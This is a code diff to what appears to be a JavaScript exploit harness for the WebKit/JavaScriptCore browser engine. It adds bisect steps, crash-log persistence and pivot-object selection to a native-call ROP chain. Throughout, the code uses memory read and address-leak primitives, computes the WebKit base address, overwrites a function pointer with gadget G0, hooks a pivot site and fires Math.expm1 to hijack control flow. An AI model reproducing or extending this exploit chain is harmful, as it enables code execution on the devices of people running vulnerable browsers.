@@ -66,7 +66,7 @@ import { prepNativeChain, stageGetpid, stageUsleep, fireNativeCall, fireUsleep, 
     patchPrepG5, verifySlabAddrs, CHAIN_POP_ROWS } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250830ab";
+const BUILD_ID = "rw-20250830ac";
 
 const NATIVE_BISECT_STEPS = [
     { id: "smoke-now", label: "N0 smoke", title: "atomic layout+fire @ prep (chain_poops callAddr)" },
@@ -75,7 +75,9 @@ const NATIVE_BISECT_STEPS = [
     { id: "arm-g0", label: "N3 arm G0", title: "write G0 → main m_function" },
     { id: "hook", label: "N4 hook", title: "hook @ leakval+0x30 (13.52 G0 rsi+0x30)" },
     { id: "hook-poops", label: "N4b hook0", title: "hook @ leakval+0 (poops 13.00 style)" },
-    { id: "expm1", label: "N5 expm1", title: "Math.expm1 — pivot runs (OOM likely here)" },
+    { id: "expm1-lite", label: "N5a exp1", title: "expm1(1) G0 armed NO hook" },
+    { id: "expm1-nohook", label: "N5c obj", title: "expm1(pivotObj) G0 armed NO hook" },
+    { id: "expm1", label: "N5 expm1", title: "expm1(pivotObj) after N4 hook" },
     { id: "expm1-g5alt", label: "N5b G5alt", title: "G5=expm1+0x53642a then expm1 (after N3+N4)" },
     { id: "restore", label: "N6 restore", title: "restore pivot + main" },
     { id: "smoke-full", label: "N7 smoke", title: "layout + full fire (smoke)" },
@@ -196,6 +198,7 @@ const crashLog = createCrashLog({
     ssBuild: "wk-rw-log-build",
     buildId: BUILD_ID,
     maxLines: 200,
+    critical: /^(FAIL|ERROR|OOM|GIVE-UP|PRIMITIVE|NATIVE|BISECT|SMOKE|PREP-PIN|LK-|PASS|WARN|BOOT|LOG-CLEAR|ATTEMPT|READ-PRIMITIVE|TRIM|HINT)/,
 });
 const CORE_LOG = /ADDROF|FAIL|ERROR|PRIMITIVE|PASS|GIVE-UP|ATTEMPT|SETUP|CARRIER|PAIR|SSV-|TRIM-DEBRIS|ADDROF-RELEASE|FAKE-ADDRESS|READ-PRIMITIVE|PLACEMENT|COMPOSITION|NORMAL-CLONE|ZERO-HEADER|VALIDATION|LOAD-THREW|NO-RESULT|PRIMITIVE-OK|AUTO-RETRY|CORE-GIVE-UP|HINT-GROOM/i;
 
@@ -248,9 +251,10 @@ function mark(tag, detail) {
         return;
     }
     if (nativeQuiet) {
-        if (/^NATIVE-|^PIVOT-|^BASES|^STUBS|^ERROR|^HINT/.test(tag)) {
+        if (/^NATIVE-|^PIVOT-|^BASES|^STUBS|^ERROR|^HINT|^BISECT|^SMOKE|^PREP-PIN/.test(tag)) {
             lines.push(line);
-            if (lines.length > 24) lines.splice(0, lines.length - 24);
+            if (lines.length > 48) lines.splice(0, lines.length - 48);
+            crashLog.append(line, tag);
             renderOut();
         }
         return;
@@ -3579,12 +3583,14 @@ function ensureNativePrep(p, off) {
     if (!nativeFn) throw new Error("nativeFn capture failed");
     const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
     persistSessionBases(nativeFn, webkitBase, { trust: "rw" });
-    const pivotObj = {};
+    const pivotObj = pivotObjForPrep(window._wkCarrier);
     const pivotCell = p.leakval(pivotObj);
     nativePrep = prepNativeChain(p, off, webkitBase, {
         mainMf, mainOrig, pivotObj, pivotCell,
     });
     nativePrep.keepAlive.push(pivotObj);
+    mark("NATIVE-PREP", "pivot=" + (params.get("pivot") === "obj" ? "{}" : "textarea")
+        + " cell=" + pivotCell);
     pinNativeRetain();
     return nativePrep;
 }
@@ -3713,16 +3719,51 @@ function requireNativePrep() {
     if (!nativePrep) throw new Error("run N1 prep first");
 }
 
+function pivotObjForPrep(carrier) {
+    if (params.get("pivot") === "obj") return {};
+    if (carrier && carrier.textarea) return carrier.textarea;
+    return {};
+}
+
+/** Visible log + sessionStorage flush (survives N5 OOM on reload). */
+function bisectLog(tag, detail) {
+    mark(tag, detail);
+    try {
+        crashLog.append(tag + (detail == null || detail === "" ? "" : "  " + detail), tag);
+        crashLog.flushSync();
+    } catch (_) { }
+    renderOut();
+}
+
+function bisectSnapshot(p, prep, off, label) {
+    if (!prep || !p) return;
+    const mainNow = prep.mainMf ? p.read8(prep.mainMf) : null;
+    const site = prep._bisect && prep._bisect.pivotSite;
+    let hookPeek = null;
+    if (site) {
+        try { hookPeek = p.read8(site); } catch (_) { hookPeek = null; }
+    }
+    let slab = null;
+    try { slab = verifySlabAddrs(p, prep); } catch (_) { }
+    bisectLog("BISECT-SNAP", (label || "?")
+        + " wb=" + prep.webkitBase
+        + " mainMf=" + prep.mainMf + " now=" + mainNow + " G0=" + prep.G.G0
+        + " orig=" + prep.mainOrig
+        + " pivotCell=" + prep.pivotCell
+        + " hookSite=" + (site || "—") + " hookPeek=" + hookPeek
+        + " S=" + (prep.M && prep.M.S)
+        + (slab ? " slab S=" + slab.S.ok + " K=" + slab.K.ok
+            + (slab.rsp ? " rsp=" + slab.rsp.ok : "") : ""));
+}
+
 /** One bisect step — survives = BISECT-OK in log; OOM = tab dies on that step. */
 function runNativeBisectStep(stepId) {
     if (!ready || !window.p || busy || !nativeAllowed) return;
     const p = window.p;
     const off = loadEffectiveOff();
     busy = true;
-    nativeQuiet = true;
     setUi();
-    mark("BISECT", "step " + stepId + " build=" + BUILD_ID);
-    renderOut();
+    bisectLog("BISECT", "step " + stepId + " build=" + BUILD_ID);
     let pid = -1;
     try {
         switch (stepId) {
@@ -3757,21 +3798,23 @@ function runNativeBisectStep(stepId) {
             layoutSmokeStack(nativePrep);
             try {
                 const slab = verifySlabAddrs(p, nativePrep);
-                mark("BISECT-SLAB", "S=" + slab.S.ok + " P=" + slab.P.ok
+                bisectLog("BISECT-SLAB", "S=" + slab.S.ok + " P=" + slab.P.ok
                     + " K=" + slab.K.ok + " F=" + slab.F.ok
-                    + (slab.rsp ? " rsp=" + slab.rsp.ok : ""));
+                    + (slab.rsp ? " rsp=" + slab.rsp.ok : "")
+                    + " Kaddr=" + nativePrep.M.K + " Saddr=" + nativePrep.M.S);
                 if (!slab.K.ok || !slab.S.ok)
-                    mark("BISECT-WARN", "slab addr unreadable — bufAddr wrong, pivot will OOM");
+                    bisectLog("BISECT-WARN", "slab unreadable — bufAddr wrong → pivot OOM");
             } catch (slabErr) {
-                mark("BISECT-WARN", "slab check: " + (slabErr.message || slabErr));
+                bisectLog("BISECT-WARN", "slab check: " + (slabErr.message || slabErr));
             }
-            mark("BISECT-OK", "N2 layout smoke — stack only, no JSC writes");
+            bisectLog("BISECT-OK", "N2 layout smoke");
             state("N2 layout OK", "ok");
             break;
         case "arm-g0":
             requireNativePrep();
             bisectArmG0(p, nativePrep);
-            mark("BISECT-OK", "N3 armed G0 → mainMf (expm1 not called yet)");
+            bisectSnapshot(p, nativePrep, off, "post-N3");
+            bisectLog("BISECT-OK", "N3 armed G0 → mainMf");
             state("N3 arm G0 OK", "ok");
             break;
         case "hook":
@@ -3781,31 +3824,50 @@ function runNativeBisectStep(stepId) {
                 const d = describeSlabLayout(p, nativePrep);
                 const site = nativePrep._bisect && nativePrep._bisect.pivotSite;
                 const armed = p.read8(nativePrep.mainMf);
-                mark("BISECT-OK", "N4 hook site=" + site + " → S=" + nativePrep.M.S
+                bisectLog("BISECT-OK", "N4 hook site=" + site + " → S=" + nativePrep.M.S
                     + " hook+0x" + (off.pivot_hook_off != null
                         ? off.pivot_hook_off.toString(16) : "0")
                     + " mainMf=" + armed + " wantG0=" + nativePrep.G.G0
                     + " rsp=" + d.rsp);
                 if (d.stackTop.length)
-                    mark("BISECT-STACK", d.stackTop.map((q, i) => "[" + i + "]=" + q).join(" "));
+                    bisectLog("BISECT-STACK", d.stackTop.map((q, i) => "[" + i + "]=" + q).join(" "));
             } catch (logErr) {
-                mark("BISECT-OK", "N4 hook (layout log: " + (logErr.message || logErr) + ")");
+                bisectLog("BISECT-OK", "N4 hook log err: " + (logErr.message || logErr));
             }
             state("N4 hook OK", "ok");
             break;
         case "hook-poops":
             requireNativePrep();
             bisectHookPivotPoops(p, nativePrep);
-            mark("BISECT-OK", "N4b hook @ leakval+0 (poops) → S=" + nativePrep.M.S);
+            bisectSnapshot(p, nativePrep, off, "post-N4b");
+            bisectLog("BISECT-OK", "N4b hook @ leakval+0 → S=" + nativePrep.M.S);
             state("N4b hook0 OK", "ok");
+            break;
+        case "expm1-lite":
+            requireNativePrep();
+            if (!nativePrep.mainArmed) bisectArmG0(p, nativePrep);
+            bisectSnapshot(p, nativePrep, off, "pre-N5a");
+            bisectLog("BISECT-WARN", "N5a Math.expm1(1) — G0 armed, NO hook");
+            Math.expm1(1);
+            bisectLog("BISECT-OK", "N5a expm1(1) survived");
+            state("N5a OK", "ok");
+            break;
+        case "expm1-nohook":
+            requireNativePrep();
+            if (!nativePrep.mainArmed) bisectArmG0(p, nativePrep);
+            bisectSnapshot(p, nativePrep, off, "pre-N5c");
+            bisectLog("BISECT-WARN", "N5c Math.expm1(pivotObj) — G0 armed, NO hook");
+            Math.expm1(nativePrep.pivotObj);
+            bisectLog("BISECT-OK", "N5c expm1(obj) survived");
+            state("N5c OK", "ok");
             break;
         case "expm1":
             requireNativePrep();
-            mark("BISECT-WARN", "N5 Math.expm1 — OOM = bad RSP/POP gadget, not lk");
-            renderOut();
+            bisectSnapshot(p, nativePrep, off, "pre-N5");
+            bisectLog("BISECT-WARN", "N5 Math.expm1(pivotObj) — firing…");
             bisectFireExpm1(p, nativePrep);
             pid = nativePrep.M.frameDv.getUint32(0, true) | 0;
-            mark("BISECT-OK", "N5 expm1 survived frame=" + pid);
+            bisectLog("BISECT-OK", "N5 expm1 survived frame=" + pid);
             state("N5 expm1 OK", "ok");
             break;
         case "expm1-g5alt": {
@@ -3814,11 +3876,11 @@ function runNativeBisectStep(stepId) {
             if (!g5rva) throw new Error("no G5 expm1 hint");
             const g5 = nativePrep.webkitBase.add32(g5rva);
             patchPrepG5(nativePrep, g5);
-            mark("BISECT-WARN", "N5b G5alt expm1+0x" + g5rva.toString(16) + " → " + g5);
-            renderOut();
+            bisectSnapshot(p, nativePrep, off, "pre-N5b");
+            bisectLog("BISECT-WARN", "N5b G5alt expm1+0x" + g5rva.toString(16));
             bisectFireExpm1(p, nativePrep);
             pid = nativePrep.M.frameDv.getUint32(0, true) | 0;
-            mark("BISECT-OK", "N5b G5alt survived frame=" + pid);
+            bisectLog("BISECT-OK", "N5b G5alt survived frame=" + pid);
             state("N5b G5alt OK", "ok");
             break;
         }
@@ -3873,11 +3935,10 @@ function runNativeBisectStep(stepId) {
             throw new Error("unknown step " + stepId);
         }
     } catch (err) {
-        mark("BISECT-FAIL", stepId + " " + (err.message || String(err)));
+        bisectLog("BISECT-FAIL", stepId + " " + (err.message || String(err)));
         state("bisect fail @ " + stepId, "bad");
         try { if (nativePrep) bisectRestore(p, nativePrep); } catch (_) { }
     } finally {
-        nativeQuiet = false;
         busy = false;
         setUi();
         renderOut();
